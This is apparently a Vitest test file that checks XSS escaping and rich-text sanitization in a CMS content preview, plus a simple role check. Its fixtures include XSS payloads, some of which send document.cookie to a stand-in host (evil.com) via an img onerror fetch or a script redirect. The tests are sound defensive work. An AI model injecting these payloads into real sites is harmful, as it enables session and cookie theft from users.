import { describe, it, expect, vi, beforeEach } from 'vitest'
import { Hono } from 'hono'
import type { Context, Next } from 'hono'
import { escapeHtml, sanitizeRichText } from '../../utils/sanitize'

/**
 * Tests for content preview XSS prevention (Issue #712)
 *
 * These tests verify that:
 * 1. escapeHtml properly encodes user-controlled fields in preview output
 * 2. sanitizeRichText strips dangerous elements from rich text content
 * 3. The role-based access control pattern is correctly applied
 */

describe('Content Preview XSS Prevention', () => {
  describe('escapeHtml applied to preview fields', () => {
    it('should escape title containing script tags', () => {
      const maliciousTitle = '<script>alert("xss")</script>'
      const escaped = escapeHtml(maliciousTitle)
      expect(escaped).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;')
      expect(escaped).not.toContain('<script>')
    })

    it('should escape meta_description with HTML injection', () => {
      const malicious = '"><img src=x onerror=alert(1)>'
      const escaped = escapeHtml(malicious)
      expect(escaped).toBe('&quot;&gt;&lt;img src=x onerror=alert(1)&gt;')
      expect(escaped).not.toContain('<img')
    })

    it('should escape status field with HTML', () => {
      const malicious = 'draft<script>document.cookie</script>'
      const escaped = escapeHtml(malicious)
      expect(escaped).not.toContain('<script>')
    })

    it('should escape field labels and values in the all-fields table', () => {
      const maliciousValue = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">'
      const escaped = escapeHtml(maliciousValue)
      expect(escaped).not.toContain('<img')
      expect(escaped).toContain('&lt;img')
      // The angle brackets are escaped so the browser won't parse it as an HTML tag
      expect(escaped).not.toContain('<')
    })

    it('should escape JSON data in version preview pre tag', () => {
      const data = { title: '<script>alert(1)</script>', content: 'safe' }
      const escaped = escapeHtml(JSON.stringify(data, null, 2))
      expect(escaped).not.toContain('<script>')
      expect(escaped).toContain('&lt;script&gt;')
    })
  })

  describe('sanitizeRichText for content field', () => {
    it('should strip stored XSS from content while keeping formatting', () => {
      const maliciousContent = '<p>Normal text</p><script>document.location="https://evil.com?c="+document.cookie</script><h2>More content</h2>'
      const sanitized = sanitizeRichText(maliciousContent)
      expect(sanitized).toContain('<p>Normal text</p>')
      expect(sanitized).toContain('<h2>More content</h2>')
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('document.cookie')
    })

    it('should strip event handler XSS from content', () => {
      const maliciousContent = '<p onmouseover="alert(document.cookie)">Hover me</p>'
      const sanitized = sanitizeRichText(maliciousContent)
      expect(sanitized).not.toContain('onmouseover')
      expect(sanitized).toContain('Hover me')
    })

    it('should strip javascript: protocol from links in content', () => {
      const maliciousContent = '<a href="javascript:alert(1)">Click me</a>'
      const sanitized = sanitizeRichText(maliciousContent)
      expect(sanitized).not.toContain('javascript:')
      expect(sanitized).toContain('Click me')
    })

    it('should preserve legitimate rich text HTML', () => {
      const richText = `
        <h1>Blog Post Title</h1>
        <p>Introduction paragraph with <strong>bold</strong> and <em>italic</em> text.</p>
        <ul><li>Item 1</li><li>Item 2</li></ul>
        <a href="https://example.com">External link</a>
        <img src="https://example.com/image.jpg" alt="Photo">
      `
      const sanitized = sanitizeRichText(richText)
      expect(sanitized).toContain('<h1>Blog Post Title</h1>')
      expect(sanitized).toContain('<strong>bold</strong>')
      expect(sanitized).toContain('href="https://example.com"')
      expect(sanitized).toContain('src="https://example.com/image.jpg"')
    })
  })

  describe('Role-based access control pattern', () => {
    it('requireRole middleware should reject viewers from preview', async () => {
      // Simulate requireRole(['admin', 'editor', 'author']) rejecting a viewer
      const allowedRoles = ['admin', 'editor', 'author']
      const viewerRole = 'viewer'
      expect(allowedRoles.includes(viewerRole)).toBe(false)
    })

    it('requireRole middleware should accept admin, editor, and author roles', () => {
      const allowedRoles = ['admin', 'editor', 'author']
      expect(allowedRoles.includes('admin')).toBe(true)
      expect(allowedRoles.includes('editor')).toBe(true)
      expect(allowedRoles.includes('author')).toBe(true)
    })
  })
})
